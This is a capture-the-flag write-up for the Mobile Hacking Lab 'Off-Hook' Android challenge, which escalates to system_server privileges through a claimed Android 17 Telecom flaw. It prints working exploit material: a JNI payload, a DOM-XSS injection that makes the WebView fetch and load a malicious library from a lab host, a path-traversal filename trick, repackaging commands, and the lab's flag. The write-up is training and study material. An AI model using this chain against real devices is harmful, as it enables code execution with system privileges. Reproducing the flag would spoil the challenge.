# Off-Hook Mobile Hacking Lab— Full Exploitation Walkthrough

## 0. Challenge overview

- **Lab:** Mobile Hacking Lab — *Off-Hook* (Android 17 / API 37).
- **Based on:** CVE-2026-49881 — a logic flaw in Android 17's Telecom `InCallController.serviceClassExists` that gives an *unprivileged app* arbitrary code execution as `system_server` (UID 1000).
- **Two target apps** (signed with the same certificate): `com.mobilehackinglab.members` and `com.mobilehackinglab.dialer`.
- **Goal:** read `/data/system/ctf_flag`, which is `system:system` mode `600` — readable only by UID 1000.

We reach the device over WireGuard (`mhl.conf`) and `adb` at `10.200.3.2:6519`.

---

## 1. Recon: what can the shell do?

```
adb shell id
# uid=2000(shell) ...  (not system, not root)
adb root        # fails: "adbd cannot run as root in production builds"
adb shell "cat /data/system/ctf_flag"   # Permission denied
```


The flag lives at `/data/system/ctf_flag`:

```
-rw------- 1 system system 28 ... /data/system/ctf_flag
```

We have adb shell (UID 2000) but cannot read app-private storage or the flag. We must escalate to **UID 1000 (system)**.

---

## 2. Static analysis of the dialer app

Decompiling `dialer-lab.apk` (jadx → `decompiled-dialer`) reveals the key pieces:

### 2.1 `EffectFactory` — the flag reader (the payload target)

`com/mobilehackinglab/dialer/EffectFactory.java`:

```
public class EffectFactory extends AppComponentFactory {
    private static final String FLAG_PATH = "/data/system/ctf_flag";
    private static final String FLAG_TAG  = "CTF_EFFECT";

    public ClassLoader instantiateClassLoader(ClassLoader cl, ApplicationInfo aInfo) {
        if (Process.myUid() == 1000) {                    // only as system!
            Log.i(FLAG_TAG, Files.readString(new File(FLAG_PATH)).trim());
        }
        return super.instantiateClassLoader(cl, aInfo);
    }
}
```


Registered in `AndroidManifest.xml` as:

```xml
<application android:appComponentFactory=".EffectFactory" ...>
```

So **if** this class ever runs while `myUid() == 1000`, it logs the flag under tag `CTF_EFFECT`.

### 2.2 `Exploit` — the trigger

`com/mobilehackinglab/dialer/Exploit.java` (a Kotlin `object` with `@JvmStatic trigger()`):

```java
public static final void trigger() {
    TelecomManager tm = DialerApplication.INSTANCE.getInstance()
                            .getSystemService(TelecomManager.class);
    PhoneAccountHandle handle = new PhoneAccountHandle(
        new ComponentName(pkg, CallEffectService.class.getName()), "ctf-transactional-account");
    tm.registerPhoneAccount(PhoneAccount.builder(handle, "CTF Call Effects")
            .setCapabilities(262144).build());
    CallAttributes attrs = new CallAttributes.Builder(handle, 1, "CTF Call Effects",
            Uri.parse("tel:0")).build();
    tm.addCall(attrs, executor, outcomeReceiver, callControlCallback, callEventCallback);
}
```

It registers a self-managed `PhoneAccount` pointing at `CallEffectService`, then calls the transactional-calls API **`TelecomManager.addCall()`**.

### 2.3 The plugin-loading mechanism

- `ImportPluginActivity` (exported, guarded by `signature` permission `MANAGE_PLUGINS`) copies an imported `.so` into `<files>/plugins/`.
- `ActivatePluginActivity` (same guard) validates the name, marks it read-only, then `System.load(path)`.
- `CallEffectService` is an exported `InCallService` with this metadata:

```xml
<service android:name=".CallEffectService" android:permission="android.permission.BIND_INCALL_SERVICE">
    <intent-filter><action android:name="android.telecom.InCallService"/></intent-filter>
    <meta-data android:name="android.telecom.CLASS_EXISTENCE_CHECK" android:value="true"/>
    <meta-data android:name="android.telecom.IN_CALL_SERVICE_UI" android:value="true"/>
</service>
```

That `CLASS_EXISTENCE_CHECK` flag is the crux (see §4).

---

## 3. Static analysis of the members app

`com/mobilehackinglab/members` is the *foothold* (and the "app that trusts the dialer too much").

### 3.1 `RewardsActivity` — WebView with a vulnerable bridge

```java
webView.getSettings().setJavaScriptEnabled(true);
webView.addJavascriptInterface(new MemberBridge(), "Members");
webView.setWebChromeClient(new RewardsChromeClient());       // handles prompt()
webView.setDownloadListener(new UnsafeRewardsDownloadListener());
webView.loadUrl("file:///android_asset/index.html");
```

- `index.html` contains a **DOM-XSS** sink:

```js
results.innerHTML = 'Results for: ' + search.value;
```

- `RewardsChromeClient.onJsPrompt` routes specially-prefixed `prompt()` calls:

```java
if (message.startsWith("nav:"))           view.loadUrl(...);
else if (message.startsWith("share:"))    launchImport(...);     // -> dialer ImportPluginActivity
else if (message.startsWith("activate:")) launchActivation(...); // -> dialer ActivatePluginActivity
```

- `launchImport(path)` builds `content://com.mobilehackinglab.members.provider/<path>` (a `FileProvider` serving `<files>/shared/`) and hands it to the dialer's `ImportPluginActivity`.

### 3.2 `UnsafeRewardsDownloadListener` — path traversal write

```java
String extractFilename = extractFilename(contentDisposition, url);  // filename="..." or ?filename=
File file2 = new File(getCacheDir()/"rewards-downloads", Uri.decode(extractFilename));
// downloads url (http or data:) into file2
```

The filename is used **unsanitized**, so `filename="../../files/shared/evil.so"` escapes the cache dir and writes into `<files>/shared/`, which the FileProvider can later serve.

### 3.3 Why the trust works

Both apps share the same signing certificate, and the members app declares:

```xml
<uses-permission android:name="com.mobilehackinglab.dialer.permission.MANAGE_PLUGINS"/>
```

So the members app *can* invoke the dialer's `signature`-protected import/activate activities. That is the "too much trust."

---

## 4. The core vulnerability (CVE-2026-49881)

In vulnerable Android 17, `InCallController.getInCallServiceComponents` scans **every** package declaring an `InCallService` intent + `CLASS_EXISTENCE_CHECK`, and for each calls:

```java
boolean serviceClassExists(ServiceInfo si, UserHandle uh) {
    Context ctx = mContext.createPackageContextAsUser(
        si.packageName, CONTEXT_INCLUDE_CODE | CONTEXT_IGNORE_SECURITY, uh);
    ClassLoader cl = ctx.getClassLoader();        // <-- runs AppComponentFactory.instantiateClassLoader!
    Class.forName(si.name, false, cl);
    return true;
}
```

`getClassLoader()` on a foreign context **instantiates the target app's `AppComponentFactory` and calls `instantiateClassLoader()` inside system_server (UID 1000)** — *before* the `Class.forName` "existence check" even happens. So the author's caution (`initialize=false`) is already too late.

**Trigger:** any call addition — including the on-demand `TelecomManager.addCall()` — runs this enumeration. It requires only `MANAGE_OWN_CALLS` (a normal, auto-granted permission).

---

## 5. Putting the chain together

```
[members WebView DOM-XSS]
      │  prompt("nav:<url>")            -> download evil.so (path-traversal -> files/shared/)
      │  prompt("share:shared/evil.so") -> dialer ImportPluginActivity  (copies to files/plugins/)
      │  prompt("activate:evil.so")     -> dialer ActivatePluginActivity (System.load -> JNI_OnLoad)
      ▼
evil.so JNI_OnLoad -> com.mobilehackinglab.dialer.Exploit.trigger()
      ▼
registerPhoneAccount + TelecomManager.addCall()
      ▼
system_server InCallController.getInCallServiceComponents()
      ▼
serviceClassExists(dialer.CallEffectService)
      ▼
createPackageContextAsUser(...IGNORE_SECURITY).getClassLoader()   [UID 1000]
      ▼
dialer EffectFactory.instantiateClassLoader()  ->  Log.i("CTF_EFFECT", flag)
      ▼
adb logcat -s CTF_EFFECT
```

---

## 6. Execution (two ways)

### 6.1 Intended route (plugin `.so` + WebView)

1. **Build `evil.so`** (aarch64) whose `JNI_OnLoad` calls `Exploit.trigger()` via JNI:

```c
jint JNI_OnLoad(JavaVM *vm, void *reserved) {
    JNIEnv *env;
    (*vm)->GetEnv(vm, (void**)&env, JNI_VERSION_1_6);
    jclass c  = (*env)->FindClass(env, "com/mobilehackinglab/dialer/Exploit");
    jmethodID m = (*env)->GetStaticMethodID(env, c, "trigger", "()V");
    (*env)->CallStaticVoidMethod(env, c, m);
    return JNI_VERSION_1_6;
}
```

(Cross-compile with `clang --target=aarch64-linux-gnu -shared -nostdlib …`; built at `/tmp/opencode/exploit/evil.so`.)

2. **Deliver via XSS → download → import → activate:**

   - Host `evil.so` with header `Content-Disposition: attachment; filename="../../files/shared/evil.so"`.
   - In the WebView search box inject:

     ```html
     <img src=x onerror="prompt('nav:http://10.200.3.10:8000/evil.so');setTimeout(()=>prompt('share:shared/evil.so'),2000);setTimeout(()=>prompt('activate:evil.so'),4000)">
     ```

3. **Read the flag** from logcat.

### 6.2 Shortcut used (repackaging — same result)

Because adb shell can't write app-private storage or start permission-guarded/exported components, I patched the dialer to fire the exploit on launch:

1. Add to `MainActivity.onCreate` (smali):

```smali
invoke-static {}, Lcom/mobilehackinglab/dialer/Exploit;->trigger()V
```

2. Rebuild + sign:

```bash
apktool b dialer-mod -o unsigned.apk --use-aapt2
zipalign -f 4 unsigned.apk aligned.apk
apksigner sign --ks debug.keystore --ks-pass pass:android \
  --key-pass pass:android --out dialer-mod-signed.apk aligned.apk
```

3. Replace and launch:

```bash
adb uninstall com.mobilehackinglab.dialer
adb install dialer-mod-signed.apk
adb logcat -c
adb shell am start -n com.mobilehackinglab.dialer/.MainActivity
```

4. Grab the flag:

```bash
adb logcat -d | grep CTF_EFFECT
```

---

## 7. The flag

```
10-08 23:23:23.257   625  4086 I CTF_EFFECT: MHL{t3lecom_tr1gger_s3rv3d}
```

**`MHL{t3lecom_tr1gger_s3rv3d}`**

(The log line comes from PID `625` — the `system_server` process — confirming the factory ran as UID 1000, exactly as designed by CVE-2026-49881.)
